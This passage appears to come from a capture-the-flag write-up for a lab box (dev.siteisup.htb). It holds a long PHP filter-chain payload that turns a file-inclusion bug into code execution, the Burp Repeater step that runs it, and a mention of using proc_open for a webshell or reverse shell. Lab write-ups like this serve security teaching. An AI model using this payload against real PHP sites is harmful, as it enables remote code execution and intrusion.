iconv.UTF8.UTF7|convert.iconv.851.UTF-16|convert.iconv.L1.T.618BIT|convert.base64-decode|convert.base64-encode|convert.iconv.UTF8.UTF7|convert.iconv.CP861.UTF-16|convert.iconv.L4.GB13000|convert.iconv.BIG5.JOHAB|convert.base64-decode|convert.base64-encode|convert.iconv.UTF8.UTF7|convert.iconv.L6.UNICODE|convert.iconv.CP1282.ISO-IR-90|convert.base64-decode|convert.base64-encode|convert.iconv.UTF8.UTF7|convert.iconv.CP1046.UTF32|convert.iconv.L6.UCS-2|convert.iconv.UTF-16LE.T.61-8BIT|convert.iconv.865.UCS-4LE|convert.base64-decode|convert.base64-encode|convert.iconv.UTF8.UTF7|convert.iconv.SE2.UTF-16|convert.iconv.CSIBM921.NAPLPS|convert.iconv.855.CP936|convert.iconv.IBM-932.UTF-8|convert.base64-decode|convert.base64-encode|convert.iconv.UTF8.UTF7|convert.iconv.CP869.UTF-32|convert.iconv.MACUK.UCS4|convert.iconv.UTF16BE.866|convert.iconv.MACUKRAINIAN.WCHAR_T|convert.base64-decode|convert.base64-encode|convert.iconv.UTF8.UTF7|convert.iconv.PT.UTF32|convert.iconv.KOI8-U.IBM-932|convert.base64-decode|convert.base64-encode|convert.iconv.UTF8.UTF7|convert.iconv.CP367.UTF-16|convert.iconv.CSIBM901.SHIFT_JISX0213|convert.iconv.UHC.CP1361|convert.base64-decode|convert.base64-encode|convert.iconv.UTF8.UTF7|convert.iconv.L6.UNICODE|convert.iconv.CP1282.ISO-IR-90|convert.iconv.ISO6937.8859_4|convert.iconv.IBM868.UTF-16LE|convert.base64-decode|convert.base64-encode|convert.iconv.UTF8.UTF7|convert.iconv.CP861.UTF-16|convert.iconv.L4.GB13000|convert.base64-decode|convert.base64-encode|convert.iconv.UTF8.UTF7|convert.iconv.DEC.UTF-16|convert.iconv.ISO8859-9.ISO_6937-2|convert.iconv.UTF16.GB13000|convert.base64-decode|convert.base64-encode|convert.iconv.UTF8.UTF7|convert.iconv.SE2.UTF-16|convert.iconv.CSIBM1161.IBM-932|convert.iconv.BIG5HKSCS.UTF16|convert.base64-decode|convert.base64-encode|convert.iconv.UTF8.UTF7|convert.iconv.JS.UNICODE|convert.iconv.L4.UCS2|convert.base64-decode|convert.base64-encode|convert.iconv.UTF8.UTF7|convert.iconv.CSGB2312.UTF-32|convert.iconv.IBM-1161.IBM932|convert.iconv.GB13000.UTF16BE|convert.iconv.864.UTF-32LE|convert.base64-decode|convert.base64-encode|convert.iconv.UTF8.UTF7|convert.iconv.CP1046.UTF16|convert.iconv.ISO6937.SHIFT_JISX0213|convert.base64-decode|convert.base64-encode|convert.iconv.UTF8.UTF7|convert.iconv.CP869.UTF-32|convert.iconv.MACUK.UCS4|convert.iconv.UTF16BE.866|convert.iconv.MACUKRAINIAN.WCHAR_T|convert.base64-decode|convert.base64-encode|convert.iconv.UTF8.UTF7|convert.iconv.DEC.UTF-16|convert.iconv.ISO8859-9.ISO_6937-2|convert.iconv.UTF16.GB13000|convert.base64-decode|convert.base64-encode|convert.iconv.UTF8.UTF7|convert.iconv.8859_3.UTF16|convert.iconv.863.SHIFT_JISX0213|convert.base64-decode|convert.base64-encode|convert.iconv.UTF8.UTF7|convert.iconv.851.UTF-16|convert.iconv.L1.T.618BIT|convert.base64-decode|convert.base64-encode|convert.iconv.UTF8.UTF7|convert.iconv.JS.UNICODE|convert.iconv.L4.UCS2|convert.iconv.UCS-2.OSF00030010|convert.iconv.CSIBM1008.UTF32BE|convert.base64-decode|convert.base64-encode|convert.iconv.UTF8.UTF7|convert.iconv.JS.UNICODE|convert.iconv.L4.UCS2|convert.iconv.UCS-4LE.OSF05010001|convert.iconv.IBM912.UTF-16LE|convert.base64-decode|convert.base64-encode|convert.iconv.UTF8.UTF7|convert.iconv.CP869.UTF-32|convert.iconv.MACUK.UCS4|convert.base64-decode|convert.base64-encode|convert.iconv.UTF8.UTF7|convert.iconv.SE2.UTF-16|convert.iconv.CSIBM1161.IBM-932|convert.iconv.MS932.MS936|convert.base64-decode|convert.base64-encode|convert.iconv.UTF8.UTF7|convert.iconv.SE2.UTF-16|convert.iconv.CSIBM1161.IBM-932|convert.iconv.BIG5HKSCS.UTF16|convert.base64-decode|convert.base64-encode|convert.iconv.UTF8.UTF7|convert.iconv.SE2.UTF-16|convert.iconv.CSIBM921.NAPLPS|convert.iconv.855.CP936|convert.iconv.IBM-932.UTF-8|convert.base64-decode|convert.base64-encode|convert.iconv.UTF8.UTF7|convert.iconv.8859_3.UTF16|convert.iconv.863.SHIFT_JISX0213|convert.base64-decode|convert.base64-encode|convert.iconv.UTF8.UTF7|convert.iconv.CP1046.UTF16|convert.iconv.ISO6937.SHIFT_JISX0213|convert.base64-decode|convert.base64-encode|convert.iconv.UTF8.UTF7|convert.iconv.CP1046.UTF32|convert.iconv.L6.UCS-2|convert.iconv.UTF-16LE.T.61-8BIT|convert.iconv.865.UCS-4LE|convert.base64-decode|convert.base64-encode|convert.iconv.UTF8.UTF7|convert.iconv.MAC.UTF16|convert.iconv.L8.UTF16BE|convert.base64-decode|convert.base64-encode|convert.iconv.UTF8.UTF7|convert.iconv.CSIBM1161.UNICODE|convert.iconv.ISO-IR-156.JOHAB|convert.base64-decode|convert.base64-encode|convert.iconv.UTF8.UTF7|convert.iconv.INIS.UTF16|convert.iconv.CSIBM1133.IBM943|convert.iconv.IBM932.SHIFT_JISX0213|convert.base64-decode|convert.base64-encode|convert.iconv.UTF8.UTF7|convert.iconv.SE2.UTF-16|convert.iconv.CSIBM1161.IBM-932|convert.iconv.MS932.MS936|convert.iconv.BIG5.JOHAB|convert.base64-decode|convert.base64-encode|convert.iconv.UTF8.UTF7|convert.base64-decode/resource=php://temp

```

I’ll visit `http://dev.siteisup.htb/?page=admin` to get that request into Burp. Now I can send that request over to Repeater, and I’ll replace `admin` with that full chain above. On sending, it works:

![image-20230118201701779](https://0xdfimages.gitlab.io/img/image-20230118201701779.png)

There’s some extra junk at the end, but the PHP must have been added to the page and executed to print “0xdf was here”.

If I can run `echo`, I can also run `proc_open` just like above, using this to get a webshell and/or a reverse shell, though this can be very tricky as the URL gets long, and then the site will start 414 Request-URI Too Long errors. There’s probably a way to bypass this by loading remote code or something.